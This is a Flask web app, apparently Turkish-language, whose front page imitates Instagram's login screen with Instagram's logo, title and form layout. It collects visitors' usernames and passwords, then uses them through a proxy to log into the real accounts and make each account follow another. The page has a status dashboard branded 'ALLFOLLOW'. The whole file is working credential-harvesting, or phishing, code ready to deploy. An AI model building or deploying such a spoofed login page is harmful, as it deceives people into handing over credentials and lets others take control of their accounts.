import os
import sys
import threading
import asyncio
import concurrent.futures
import time
import logging
import traceback
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash
from dotenv import load_dotenv

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# instagrapi import
try:
    from instagrapi import Client
    from instagrapi.exceptions import (
        ChallengeRequired, 
        LoginRequired, 
        PleaseWaitFewMinutes,
        BadPassword,
        TwoFactorRequired,
        UnknownError,
        RateLimitError
    )
    INSTAGRAPI_AVAILABLE = True
    logger.info("instagrapi yüklendi")
except ImportError as e:
    logger.error(f"instagrapi yüklü değil: {e}")
    INSTAGRAPI_AVAILABLE = False
    Client = None

load_dotenv()

app = Flask(__name__)

# SQLite (Render'da daha stabil)
db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data.db")
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", f"sqlite:///{db_path}")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "secret-key-123")

db = SQLAlchemy(app)

# PROXY
PROXY_URL = os.getenv("PROXY_URL", "").strip()

class IGAccount(db.Model):
    __tablename__ = 'accounts'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    status = db.Column(db.String(200), default="Beklemede")
    last_login = db.Column(db.DateTime)
    login_attempts = db.Column(db.Integer, default=0)
    error_log = db.Column(db.Text)

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

db_lock = threading.Lock()

# ThreadPoolExecutor - instagrapi için ayrı thread havuzu
executor = concurrent.futures.ThreadPoolExecutor(max_workers=3)

def create_client():
    """Instagrapi client oluştur"""
    if not INSTAGRAPI_AVAILABLE:
        raise ImportError("instagrapi yüklü değil")
    
    cl = Client()
    if PROXY_URL:
        try:
            cl.set_proxy(PROXY_URL)
            logger.info("Proxy aktif")
        except Exception as e:
            logger.warning(f"Proxy hatası: {e}")
    
    cl.request_timeout = 25
    cl.delay_range = [1, 2]
    return cl

def sync_login_task(username, password):
    """
    SENKRON login fonksiyonu - ThreadPoolExecutor'da çalışır
    Bu fonksiyon ana Flask thread'ini bloklamaz
    """
    logger.info(f"[THREAD] Login başlıyor: {username}")
    
    try:
        # Database bağlamını oluştur
        with app.app_context():
            with db_lock:
                acc = IGAccount.query.filter_by(username=username.lower()).first()
                if acc:
                    acc.login_attempts += 1
                    acc.status = "Giriş deneniyor..."
                    db.session.commit()
        
        # Client oluştur ve login dene
        cl = create_client()
        
        try:
            logger.info(f"[THREAD] cl.login() çağrılıyor: {username}")
            cl.login(username, password)
            logger.info(f"[THREAD] Login BAŞARILI: {username}")
            
            # Başarılı - database güncelle
            with app.app_context():
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    if acc:
                        acc.status = "AKTİF ✅ - Giriş başarılı"
                        acc.last_login = db.func.now()
                        db.session.commit()
            
            # Takip et
            try:
                instagram_id = cl.user_id_from_username("instagram")
                cl.user_follow(instagram_id)
                logger.info(f"[THREAD] Takip edildi: {username}")
                
                with app.app_context():
                    with db_lock:
                        acc = IGAccount.query.filter_by(username=username.lower()).first()
                        if acc:
                            acc.status = "AKTİF ✅ - Takip tamamlandı"
                            db.session.commit()
            except Exception as e:
                logger.warning(f"[THREAD] Takip hatası: {e}")
                
        except ChallengeRequired:
            logger.warning(f"[THREAD] Challenge: {username}")
            with app.app_context():
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    if acc:
                        acc.status = "ONAY GEREKİYOR ⚠️ - Instagram'dan onaylayın"
                        db.session.commit()
                        
        except TwoFactorRequired:
            logger.warning(f"[THREAD] 2FA: {username}")
            with app.app_context():
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    if acc:
                        acc.status = "2FA GEREKİYOR ⚠️ - Doğrulama kodu girin"
                        db.session.commit()
                        
        except BadPassword:
            logger.warning(f"[THREAD] Yanlış şifre: {username}")
            with app.app_context():
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    if acc:
                        acc.status = "HATA ❌ - Yanlış şifre"
                        db.session.commit()
                        
        except PleaseWaitFewMinutes:
            logger.warning(f"[THREAD] Rate limit: {username}")
            with app.app_context():
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    if acc:
                        acc.status = "BEKLEME ⏳ - 10dk sonra tekrar deneyin"
                        db.session.commit()
                        
        except Exception as e:
            error_msg = str(e)
            logger.error(f"[THREAD] Login hatası: {type(e).__name__}: {error_msg}")
            
            with app.app_context():
                with db_lock:
                    acc = IGAccount.query.filter_by(username=username.lower()).first()
                    if acc:
                        if "checkpoint" in error_msg.lower():
                            acc.status = "ONAY GEREKİYOR ⚠️"
                        elif "password" in error_msg.lower():
                            acc.status = "HATA ❌ - Şifre hatalı"
                        else:
                            acc.status = f"HATA ❌ - {error_msg[:50]}"
                        acc.error_log = error_msg
                        db.session.commit()
        
        finally:
            try:
                cl.logout()
            except:
                pass
                
    except Exception as e:
        logger.error(f"[THREAD] Genel hata: {e}")
        logger.error(traceback.format_exc())

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    """
    ANA ENDPOINT - Hiçbir zaman bloklanmaz!
    Sadece database kaydı yapar ve thread havuzuna gönderir
    """
    logger.info("=" * 50)
    logger.info("Connect isteği alındı")
    
    try:
        data = request.get_json()
        if not data:
            return jsonify(status="error", message="Veri gönderilmedi"), 400
        
        username = data.get('u', '').strip().lower()
        password = data.get('p', '')
        
        logger.info(f"Kullanıcı: {username}")
        
        if not username or not password:
            return jsonify(status="error", message="Kullanıcı adı ve şifre gerekli"), 400
        
        if not INSTAGRAPI_AVAILABLE:
            return jsonify(status="error", message="Sistem hazır değil (instagrapi yok)"), 500
        
        # Database kaydı (hızlı işlem)
        with db_lock:
            acc = IGAccount.query.filter_by(username=username).first()
            
            if not acc:
                acc = IGAccount(username=username, status="Bağlanıyor...")
                acc.set_password(password)
                db.session.add(acc)
                logger.info(f"Yeni hesap oluşturuldu: {username}")
            else:
                acc.set_password(password)
                acc.status = "Bağlanıyor..."
                logger.info(f"Mevcut hesap güncellendi: {username}")
            
            db.session.commit()
        
        # ThreadPoolExecutor'a gönder (BLOKLAMAZ!)
        # submit() hemen döner, future nesnesi döndürür
        future = executor.submit(sync_login_task, username, password)
        logger.info(f"Thread havuzuna gönderildi: {username}")
        
        # Hemen yanıt dön - bekleme yok!
        return jsonify(
            status="started", 
            username=username,
            message="Giriş işlemi başlatıldı"
        )
        
    except Exception as e:
        logger.error(f"Connect hatası: {e}")
        logger.error(traceback.format_exc())
        return jsonify(status="error", message=str(e)), 500

@app.route('/api/status/<username>')
def get_status(username):
    """Durum sorgulama"""
    try:
        acc = IGAccount.query.filter_by(username=username.lower()).first()
        if not acc:
            return jsonify(status="Bilinmiyor", exists=False)
        
        return jsonify(
            status=acc.status,
            exists=True,
            attempts=acc.login_attempts,
            last_login=acc.last_login.isoformat() if acc.last_login else None
        )
    except Exception as e:
        logger.error(f"Status hatası: {e}")
        return jsonify(status="Hata", error=str(e)), 500

@app.route('/api/health')
def health():
    """Sağlık kontrolü"""
    return jsonify(
        status="ok",
        instagrapi=INSTAGRAPI_AVAILABLE,
        database="connected"
    )

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .page { display: none; }
        .active { display: block; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .shake { animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both; }
        @keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
    </style>
</head>
<body class="bg-[#fafafa] min-h-screen font-sans">

    <!-- Login Page -->
    <div id="p1" class="page active flex flex-col items-center justify-center min-h-screen p-4">
        <div class="bg-white border border-gray-300 p-8 w-full max-w-[350px] flex flex-col items-center shadow-sm rounded-sm">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="w-44 mb-8 select-none" alt="Instagram" draggable="false">
            
            <div id="errorBox" class="hidden w-full mb-3 p-3 bg-red-50 border border-red-200 rounded text-red-600 text-xs text-center font-medium"></div>
            
            <input id="u" type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" 
                   class="w-full p-3 mb-2 bg-gray-50 border border-gray-300 rounded-[3px] text-xs outline-none focus:border-gray-400 focus:bg-white transition-all"
                   autocomplete="username">
            
            <div class="relative w-full mb-4">
                <input id="p" type="password" placeholder="Şifre" 
                       class="w-full p-3 bg-gray-50 border border-gray-300 rounded-[3px] text-xs outline-none focus:border-gray-400 focus:bg-white transition-all pr-16"
                       autocomplete="current-password">
                <button type="button" onclick="togglePassword()" id="toggleBtn"
                        class="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600 text-xs font-semibold hover:text-gray-800 hidden">Göster</button>
            </div>
            
            <button onclick="giris()" id="btn" 
                    class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white py-2 rounded-[8px] font-semibold text-sm transition-all active:scale-[0.98] flex items-center justify-center h-10 disabled:bg-[#0095f6]/50">
                <div id="btnLoader" class="loader hidden border-white border-t-transparent"></div>
                <span id="btnText">Giriş Yap</span>
            </button>
            
            <div class="flex items-center my-4 w-full">
                <div class="flex-1 h-px bg-gray-300"></div>
                <span class="px-4 text-gray-500 text-xs font-semibold uppercase">veya</span>
                <div class="flex-1 h-px bg-gray-300"></div>
            </div>
            
            <button type="button" class="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm mb-4 hover:text-[#00376b] transition-colors">
                <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/></svg>
                Facebook ile Giriş Yap
            </button>
            
            <a href="#" class="text-[#00376b] text-xs hover:underline">Şifreni mi unuttun?</a>
        </div>
        
        <div class="bg-white border border-gray-300 p-6 w-full max-w-[350px] mt-3 text-center rounded-sm">
            <p class="text-sm text-gray-700">Hesabın yok mu? <a href="#" class="text-[#0095f6] font-semibold hover:text-[#1877f2]">Kaydol</a></p>
        </div>
    </div>

    <!-- Status Page -->
    <div id="p2" class="page min-h-screen bg-gray-50 p-6">
        <div class="max-w-md mx-auto pt-8">
            <h1 class="text-center font-black text-purple-600 mb-8 text-3xl italic tracking-tighter drop-shadow-sm">ALLFOLLOW</h1>
            
            <div class="bg-white p-8 rounded-[40px] shadow-2xl border-b-[6px] border-purple-500 text-center mb-6 relative overflow-hidden">
                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-purple-400 via-pink-500 to-purple-600"></div>
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-3 tracking-[0.2em]">Sistem Durumu</p>
                <div class="flex items-center justify-center gap-3 mb-2">
                    <div id="statusIcon" class="w-3 h-3 bg-yellow-400 rounded-full animate-pulse shadow-lg"></div>
                    <h2 id="msg" class="text-2xl font-black text-purple-600 italic tracking-tight">BAĞLANILIYOR...</h2>
                </div>
                <p id="subMsg" class="text-xs text-gray-400 font-medium">İşlem arka planda devam ediyor...</p>
            </div>

            <div class="bg-white p-5 rounded-3xl border border-gray-200 flex items-center justify-between shadow-sm mb-4 hover:shadow-md transition-shadow">
                <div>
                    <p class="text-[10px] text-gray-400 font-bold uppercase tracking-wider mb-0.5">Hoş geldin</p>
                    <p id="utag" class="font-black text-gray-800 text-lg tracking-tight"></p>
                </div>
                <div class="w-12 h-12 bg-gradient-to-br from-purple-100 to-pink-50 rounded-2xl flex items-center justify-center text-purple-600 font-bold italic shadow-inner border border-purple-100 text-lg">IG</div>
            </div>

            <div class="bg-white p-4 rounded-2xl border border-gray-200 shadow-sm space-y-3 mb-4">
                <div class="flex justify-between items-center text-sm border-b border-gray-100 pb-2">
                    <span class="text-gray-500 text-xs font-medium uppercase">Deneme Sayısı</span>
                    <span id="attempts" class="font-bold text-purple-600 bg-purple-50 px-3 py-1 rounded-full text-xs">0</span>
                </div>
                <div class="flex justify-between items-center text-sm">
                    <span class="text-gray-500 text-xs font-medium uppercase">Son Kontrol</span>
                    <span id="lastCheck" class="font-semibold text-gray-700 text-xs">-</span>
                </div>
            </div>

            <div class="space-y-3">
                <button onclick="checkNow()" id="checkBtn"
                        class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3.5 rounded-2xl font-bold transition-all active:scale-[0.98] text-sm shadow-lg shadow-purple-200 flex items-center justify-center gap-2">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                    Şimdi Kontrol Et
                </button>
                <button onclick="location.reload()" 
                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-700 py-3.5 rounded-2xl font-bold transition-all active:scale-[0.98] text-sm">
                    Yeniden Başla
                </button>
            </div>
        </div>
    </div>

    <script>
        let currentUser = "";
        let checkInterval = null;
        let isProcessing = false;

        // Şifre göster/gizle
        document.getElementById('p').addEventListener('input', function() {
            const btn = document.getElementById('toggleBtn');
            btn.style.display = this.value ? 'block' : 'none';
        });

        function togglePassword() {
            const input = document.getElementById('p');
            const btn = document.getElementById('toggleBtn');
            if (input.type === 'password') {
                input.type = 'text';
                btn.textContent = 'Gizle';
            } else {
                input.type = 'password';
                btn.textContent = 'Göster';
            }
        }

        function showError(msg) {
            const box = document.getElementById('errorBox');
            box.innerHTML = '<span class="font-bold">Hata:</span> ' + msg;
            box.classList.remove('hidden');
            document.getElementById('p1').classList.add('shake');
            setTimeout(() => document.getElementById('p1').classList.remove('shake'), 500);
            
            // Butonu resetle
            setTimeout(() => {
                document.getElementById('btn').disabled = false;
                document.getElementById('btnText').classList.remove('hidden');
                document.getElementById('btnLoader').classList.add('hidden');
                isProcessing = false;
            }, 500);
        }

        async function giris() {
            if (isProcessing) return;
            isProcessing = true;

            const u = document.getElementById('u').value.trim().toLowerCase();
            const p = document.getElementById('p').value;

            if (!u || !p) {
                showError('Lütfen kullanıcı adı ve şifre girin');
                return;
            }

            // Butonu yükleme durumuna getir
            const btn = document.getElementById('btn');
            btn.disabled = true;
            document.getElementById('btnText').classList.add('hidden');
            document.getElementById('btnLoader').classList.remove('hidden');
            document.getElementById('errorBox').classList.add('hidden');

            console.log('[FRONTEND] İstek gönderiliyor:', {u: u, p: '***'});

            try {
                // AbortController ile timeout ekle
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 saniye timeout

                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p}),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                console.log('[FRONTEND] Yanıt alındı, status:', res.status);

                let data;
                try {
                    data = await res.json();
                } catch (e) {
                    throw new Error('Sunucu yanıtı okunamadı');
                }
                
                console.log('[FRONTEND] Yanıt data:', data);

                if (!res.ok || data.status === 'error') {
                    throw new Error(data.message || `Sunucu hatası: ${res.status}`);
                }

                // Başarılı - sayfa geçişi
                currentUser = u;
                document.getElementById('p1').classList.remove('active');
                
                setTimeout(() => {
                    document.getElementById('p2').classList.add('active');
                    document.getElementById('utag').textContent = '@' + u;
                    startChecking();
                }, 400);

            } catch (err) {
                console.error('[FRONTEND] Hata:', err);
                
                if (err.name === 'AbortError') {
                    showError('Sunucu yanıt vermiyor (timeout)');
                } else if (err.message.includes('Failed to fetch')) {
                    showError('Bağlantı hatası - internet bağlantınızı kontrol edin');
                } else {
                    showError(err.message || 'Bilinmeyen hata');
                }
                
                isProcessing = false;
            }
        }

        function startChecking() {
            console.log('[FRONTEND] Durum kontrolü başlatıldı');
            checkStatus(); // İlk kontrol
            checkInterval = setInterval(checkStatus, 5000); // Her 5 saniye
            
            // 3 dakika sonra otomatik yavaşlat
            setTimeout(() => {
                if (checkInterval) {
                    clearInterval(checkInterval);
                    checkInterval = setInterval(checkStatus, 15000); // 15 saniyede bir
                    console.log('[FRONTEND] Kontrol aralığı yavaşlatıldı');
                }
            }, 180000);
        }

        async function checkNow() {
            if (isProcessing) return;
            isProcessing = true;
            
            const btn = document.getElementById('checkBtn');
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<div class="loader border-white border-t-transparent w-4 h-4 mr-2"></div> Kontrol ediliyor...';
            
            await checkStatus();
            
            setTimeout(() => {
                btn.disabled = false;
                btn.innerHTML = originalText;
                isProcessing = false;
            }, 1000);
        }

        async function checkStatus() {
            if (!currentUser) return;
            
            try {
                const res = await fetch('/api/status/' + currentUser);
                if (!res.ok) throw new Error('Status API hatası');
                
                const data = await res.json();
                console.log('[FRONTEND] Status:', data);

                if (!data.exists) {
                    document.getElementById('msg').textContent = 'Hesap bulunamadı';
                    return;
                }

                // UI güncelle
                const msgEl = document.getElementById('msg');
                const iconEl = document.getElementById('statusIcon');
                const subMsg = document.getElementById('subMsg');
                
                msgEl.textContent = data.status || 'Bekleniyor...';
                document.getElementById('attempts').textContent = data.attempts || 0;
                document.getElementById('lastCheck').textContent = new Date().toLocaleTimeString('tr-TR', {hour: '2-digit', minute:'2-digit', second:'2-digit'});

                // Durum renkleri
                if (data.status.includes('✅')) {
                    msgEl.className = 'text-2xl font-black text-green-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-green-500 rounded-full shadow-lg';
                    iconEl.classList.remove('animate-pulse');
                    subMsg.innerHTML = '<span class="text-green-600 font-semibold">İşlem tamamlandı!</span>';
                    
                    if (checkInterval) {
                        clearInterval(checkInterval);
                        checkInterval = null;
                    }
                } 
                else if (data.status.includes('❌')) {
                    msgEl.className = 'text-2xl font-black text-red-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-red-500 rounded-full shadow-lg';
                    subMsg.innerHTML = '<span class="text-red-500">Bir hata oluştu. Yeniden deneyin.</span>';
                }
                else if (data.status.includes('⚠️')) {
                    msgEl.className = 'text-2xl font-black text-orange-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-orange-500 rounded-full animate-bounce shadow-lg';
                    subMsg.innerHTML = '<span class="text-orange-600">Manuel işlem gerekiyor</span>';
                }
                else if (data.status.includes('⏳')) {
                    msgEl.className = 'text-2xl font-black text-blue-500 italic tracking-tight';
                    iconEl.className = 'w-3 h-3 bg-blue-500 rounded-full animate-pulse shadow-lg';
                }

            } catch (e) {
                console.error('[FRONTEND] Status check error:', e);
            }
        }

        // Enter tuşu desteği
        document.getElementById('u').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('p').focus();
            }
        });
        document.getElementById('p').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') giris();
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    # Database oluştur
    with app.app_context():
        try:
            db.create_all()
            logger.info("Database hazır")
        except Exception as e:
            logger.error(f"Database hatası: {e}")
    
    port = int(os.getenv("PORT", 10000))
    logger.info(f"Sunucu başlatılıyor: 0.0.0.0:{port}")
    logger.info(f"ThreadPoolExecutor: max_workers=3")
    
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
